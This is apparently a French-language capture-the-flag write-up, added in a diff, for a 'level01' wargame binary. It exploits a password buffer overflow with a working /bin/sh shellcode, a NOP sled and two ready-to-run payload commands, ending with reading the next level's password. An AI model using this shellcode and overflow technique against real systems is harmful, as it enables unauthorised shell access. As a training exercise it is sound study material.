@@ -1,0 +1,17 @@
+Pas d'appel a system dans le binaire il va falloir injecter un shellcode.
+On nous demande un login et un password. On ne parvient pas a faire de buffer overflow avec le login.
+On essaie avec le password, ca segfault, c'est parfait.
+On utilise get_offset pour obtenir l'offset ou se trouve l'eip. On obtient 80.
+On export un shellcode
+export SHELLCODE=`python -c "print '\x90' * 500 + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80'"`
+On copy notre main.c dans /tmp pour recuperer l'adresse de notre shellcode.
+cd /tmp && gcc main.c && ./a.out && cd
+Son adresse est la suivante : 0xffffe6f1. Avec le NOP slide on ajoute 250 : 0xffffe7eb
+On peut donc faire :
+python -c "print 'dat_wil' + '\n' + 'B'*80 + '\xff\xff\xe7\xeb'[::-1]" > /tmp/file && cat /tmp/file - | ./level01
+
+Cela ne fonctionne pas. On a une autre possibilite. c'est de mettre notre shellcode apres le login. Le memcmp ne compare que les 7 premiers characteres.
+Tout de suite apres notre login 'dat_wil' on place notre shellcode. L'adresse de celui-ci sera 0x804a040 + 7 soit 0x804a047
+On obtient :
+python -c "print 'dat_wil' + '\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80' +'\n' + 'B'*80 + '\x08\x04\xa0\x47'[::-1]" > /tmp/file && cat /tmp/file - | ./level01
+On peut cat le .pass de level02.
